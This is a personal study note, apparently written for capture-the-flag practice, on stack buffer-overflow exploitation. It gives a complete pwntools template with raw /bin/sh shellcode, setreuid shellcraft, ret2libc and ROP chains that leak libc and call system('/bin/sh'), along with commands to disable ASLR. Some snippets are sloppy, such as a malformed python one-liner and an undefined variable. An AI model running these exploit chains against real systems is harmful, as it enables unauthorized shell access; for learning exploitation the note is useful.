# things i wanted to know before i started with BOF

watch this video about common pitfalls from LiveOverflow: 
https://www.youtube.com/watch?v=re4teYmSoXA&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=17&t=452s
https://www.youtube.com/watch?v=Xvh8FkczNUc&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=25

## check the binary security

use this tools

```bash
checksec <binary>
#or
rabin2 -I <binary>
```

to check what protections are enabled, if NX is enabled we need to find a function that read our flag or use ret2libc to get code execution


## ASLF
make sure ASLF is turned off or you cant find a static memory address (outside of debugger)

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

This won't survive a reboot, so you'll have to configure this in sysctl. Add a file /etc/sysctl.d/01-disable-aslr.conf containing:

```bash
kernel.randomize_va_space = 0
```

https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization

## 32bit vs. 64bit

beside the 4bit vs. 8bit difference in the addresses there are some other differences, for example how the architectures handles the function parameters
- 32bit stores them on the stack
- 64bit the first x in registers and then on the stack

check out LiveOverflows Video about the differences: https://www.youtube.com/watch?v=vXWHmucgZW0&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=18&t=170s

if you cant debug 32bit binaries check out my blog post about this issue: https://secure77.de/pwntools-gdb-gdbserver-and-pwndbg-with-32-bit-binaries/


## GDB vs. no GDB vs. gdb.debug vs. gdb.attach
addresses are different between starting the program with gdb and outside of gdb and also between gdb.debug and gdb.attach because of starting parameters, env and pathes that are stored on the stack so the savest way would be using the gdb.attach medthod from pwntools if you need the really exact stack address.

example start gdb from pwntools with payload as parameter
```python
target = gdb.debug(['./buffer-overflow',payload])
```

## cat the shell

if the shell is executed but closed immediately we can use `cat` for reflecting STDIN to the shell

```bash
(python3 exploit.py; cat) | ./buffer_overflow 
```

https://www.youtube.com/watch?v=HSlhY4Uy8SA&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=15


## GDB cant disassemble a function

if you get something like: "No function contains specified address."
this is because gdb cant find a entry address for the function, likely because it is never called or its dynamic linked via plt, but you can still force gdb to disassemble it, you need to pass the start and end address or start + offset

`disass 0x00402200, +16`

https://stackoverflow.com/questions/39016138/how-to-force-gdb-to-disassemble-code-when-it-says-no-function-contains-program


## NOPs vs. Null bytes
- Use NOPs as a "placeholder" and for let the pointer address slide to your payload
- Use Null Bytes to close / terminate a payload or pointer address, but you cant use null bytes in a argument or when strcpy is called.
- some functions like strcpy or gets will stop copying the bytes when they get null bytes or 0x0A bytes
- you can remove 0 byte operations with push and pop https://security.stackexchange.com/questions/91969/removing-null-bytes-from-shell-code
- if possible place the shellcode behind the pointer, because then you make sure that the shellcode dont corrupt itself during runtime

## test your RCE

we can use b"\xcc" (a debugger breakpoint) to test if the code is executed, if we receive a SIGTRAP then the program hit our code

![[docs/Pasted image 20211218220543.png]]

## python2 vs. python3

there is a difference between how python2 and pyhton3 sending bytes
https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection

you can send raw bytes in pyhton 3 with the following import

```bash
python3 -c 'import sys;sys.stdout.buffer.write(b"A"  * 12 + b"\x6a\x3b\x58\")
```

## calculating vs. trying
as i started with BOF i always just "try and error" to find the correct offset or amount which i need to overflow, that is ok and sometimes the only possible way to figure out the correct paadding but if possible try to find and understand the BOF Vuln. with infos from Ghidra

for example: if you see in the code something like this

```c
char local_18 [40];

read(0,local_18,0x100);
```

go ahead and use https://www.calculator.net/hex-calculator.html to calculate the amount of chars to override the stack

0x100 = 256 bytes (reads) - 40 bytes (buffer) = 216 (payload)

40 bytes to reach the stack
216 bytes for your payload

or you can use ltrace to check the exact number of bytes a challenge binary is attempting to read.

## Payloads and Errors

Try different Payloads!! Some work and some may not work even if they reach complete and correct the stack. I spend hours to figure out why some basic shell code does not work and other works. So if you can confirm that the payload is in the stack and is executed but the program crashes, just try another with a different size.

http://shell-storm.org/shellcode/

If you receive erros like  "Illegal instruction" or SIGILL try different offsets / places for you shellcode, maybe you are on a wrong stack position and the shell instructions destroy the further instrunction by itself, then you just need to store the shellcode on another position in the stack

[[Payloads]]

# ret2libc and ROP

if nx is enabled, (check via checksec) then we cant execute payload in our stack, but we still can use syscalls from libc:
https://www.youtube.com/watch?v=m17mV24TgwY&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=16


find functions
```bash
rabin2 -i <binary>
rabin2 -qs <binary> | grep -ve imp -e ' 0 '
nm -u <binary>
```

find strings
```bash
rabin2 -z split
```

### find gadgets

tools
```bash
ropper -f split --search "pop rdi"
# or (founds a little bit more)
ROPgadget --binary ./split

```

## leak the base address of libc

a good write up about how this works: https://roarribbit.blogspot.com/2021/12/hack-box-cyber-santa-ctf-pwn-day-3.html

if we are going to overflow remote services and have access to the used libc we can use a puts gadget to leak the address of puts from the libc, with this we can calculate the offset and then can call every function in the libc.

for this, we first need to find a rdi gadget (x64) to set a param

e = our loaded binary with pwntools ELF function
```python
rop = ROP(e) 
pop_rdi_gadget = (rop.find_gadget(['pop rdi', 'ret']))[0]
pop_rdi_gadget = p64(pop_rdi_gadget)
```

then we need to find a puts call in our binary and the puts address in the GOT (Global Offset Table)

```python
PUTS_PLT = e.plt['puts']
PUTS_GOT = e.got['puts']
puts_addr = p64(PUTS_PLT)
puts_got = p64(PUTS_GOT)
```

finally we can craft a gadget chain, which we put in our return pointer (in the BOF). if you input is printed to us then we can receive the puts address

```python
payload = padding + pop_rdi_gadget + puts_got + puts_addr + main_addr

target.sendlineafter(b">", payload)
leak = target.recvline()
```

then we need to find the puts address, this should be printed behind our RDI Gadget, first we clean up the rdi address (remove zero bytes, because these are not availible in our output).
then we take the next 6bytes after our rdi gadget address and finally adjust them to fit in 8bytes

```python
# remove zero bytes from the rdi gadget address
clean_rdi_gadget = pop_rdi_gadget.replace(b"\x00",b"")

# find the rdi gagdet call from the leaked stack
l = leak.find(clean_rdi_gadget) + 3 

# retrieve the puts adress from the leak and fit it to 8bytes
puts_libc = u64(leak[l:l+6].ljust(8,b"\x00"))
log.success("Puts addr from libc: " + hex(puts_libc))
```

then we can calculate the base address out of it

```python
# Calculate LIBC addresses for system(address_to_"/bin/sh")
libc.address = puts_libc - libc.symbols['puts']
log.info("libc base @ %s" % hex(libc.address))
```

if we have the base address, we are able to find desired functions / calls in the libc library

```python
# Find system call and /bin/sh in the libc file
BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

# print them out
log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

# prepare for the payload
system_call = p64(SYSTEM)
binsh_got = p64(BINSH)
````

## align the stack on a remote target

sometimes its necessary to provide a extra single "ret" instruction before calling the system() function to align the stack.  Locally, it doesn't matter, but most of the time, the remote target's stack is unaligned and require this extra "ret" to call the system() function.

```python
ret = (rop.find_gadget(['ret']))[0]

payload = padding + pop_rdi_gadget + binsh_got + ret_gadget + system_call + exit

```



# find offset and bad chars

Create Pattern
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
cyclic 500
```

calc Offset
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0Af1 -l 500
cyclic -l iaaa 
```

all bytes for testing
```bash
b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

# pwntools

see [[pwntools]]

use a template!

```python
from sys import argv
from pwn import *

binary = './buffer-overflow'
host, port = '10.10.10.200:3737'.split(':')
port = int(port)

e = ELF(binary, checksec=False)         # setting pwntools context os/arch
context.os = 'linux'    # so that we won't have to specify it explicitly
context.arch = e.arch   # when using pwntools functions like asm etc.

# debug and log out
context.log_level = 'info'
info("starting exploit...")


params = ""

# Command line arguments handling
if args['REMOTE']:
    target = remote(host, port)
    libc = ELF('./libc.so.6')
elif args['GDB']:
    gdbscript = args['GDB'] if args['GDB'] != 'True' else 'break *&do_test+86'
    target = gdb.debug([binary,params], gdbscript=gdbscript)
else:
    target = process([binary,params])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


# cylic
g = cyclic_gen()
g.get(200)


# sending and receiving stuff
target.sendafter('hello', "payload")
target.sendline(b"1")
print(target.recvall())


# string to hex address (base 16)
rsp = target.recvuntil(b">")
buffer_addr = rsp[64:78]
new_buff_addr = int(buffer_addr,16) + 0x50


stackSize = 152

offset = b"\x90" * 90
trap = b"\xcc"
suid = asm(shellcraft.setreuid(1002))

binShell = asm(shellcraft.sh())

binShell =  b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
spacer = b"\x90" * (stackSize - len(suid) - len(offset) - len(binShell))
pointer = b"\xb8\xe0\xff\xff\xff\x7f"
new_pointer = p64(new_buff_addr)

returnAdd = 0x7fffffffe0e8
print("set Pointer before: " + hex(returnAdd - stackSize + len(offset)))

# packing
pointer = p64(0x7fffffffe09f)

# 48 bit to avoid null bits (addional substract 10 byte for the nop slide)
pointer = pack(0x7fffffffe09f-10,48)


# build the payload
payload = offset + suid + binShell + spacer + pointer


#print out the payload for python3
paystring = '\\x' + '\\x'.join('{:02x}'.format(x) for x in payload)

# payload print via pip to cat
print("(python -c 'print(b\"" + paystring + "\")'; cat) | ./intro2pwnFinal")
# python 3 payload as parameter
print("./buffer-overflow-2 `python3 -c 'import sys;sys.stdout.buffer.write(b\"" + paystring + "\")'`")
# and python 2 as parameter
print("./buffer-overflow-2 `python -c 'print(b\"" + paystring + "\")'`")
# gdb payload
print("r < <(python -c 'print(b\"" + paystring + "\")')")



target.send(payload)


# gdb.attach(target,gdbscript='''
# set follow-fork-mode child
# continue
# ''')


target.interactive()


### ELF and ROP findings


# take rops from elf, seach a pop rdi gateget to set params for the puts function
rop = ROP(e)
pop_rdi_gadget = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret_gadget = (rop.find_gadget(['ret']))[0]
ret_gadget = p64(ret_gadget)

# automate to find the first puts call, main call, and the puts in got
PUTS_PLT = e.plt['puts']
PUTS_GOT = e.got['puts']
MAIN_PLT = e.symbols['main']


exit = p64(e.symbols['exit'])
log.info("Main start: " + hex(MAIN_PLT))
log.info("puts plt: " + hex(PUTS_PLT))
log.info("puts plt in got: " + hex(PUTS_GOT))

main_addr = p64(MAIN_PLT)
puts_addr = p64(PUTS_PLT)
puts_got = p64(PUTS_GOT)


### read leakes address

leak = target.recvline()
print("leak \n")
print(leak)


# remove zero bytes from the rdi gadget address
clean_rdi_gadget = pop_rdi_gadget.replace(b"\x00",b"")

# find the rdi gagdet call from the leaked stack
l = leak.find(clean_rdi_gadget) + 3 

# retrieve the puts adress from the leak and fit it to 8bytes
puts_libc = u64(leak[l:l+6].ljust(8,b"\x00"))
log.success("Puts addr from libc: " + hex(puts_libc))


# Calculate LIBC addresses for system(address_to_"/bin/sh")
libc.address = puts_libc - libc.symbols['puts']
log.info("libc base @ %s" % hex(libc.address))

# Find system call and /bin/sh in the libc file
BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]
log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
system_call = p64(SYSTEM)
binsh_got = p64(BINSH)

#send the second payload provide a second ret_gadget to adjust the stack

payload = padding + pop_rdi_gadget + binsh_got + ret_gadget + system_call + exit
```
